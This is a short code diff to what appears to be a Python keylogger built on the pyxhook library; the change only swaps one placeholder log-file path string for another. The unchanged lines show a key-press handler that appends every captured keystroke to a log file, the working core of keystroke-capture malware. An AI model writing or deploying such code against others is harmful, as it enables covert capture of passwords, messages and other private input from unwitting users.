@@ -1,5 +1,5 @@
 import pyxhook
-log_file='path should be neet'
+log_file='make changes here'
 def OnKeyPress(event):
   fob=open(log_file,'a')
   fob.write(event.Key)
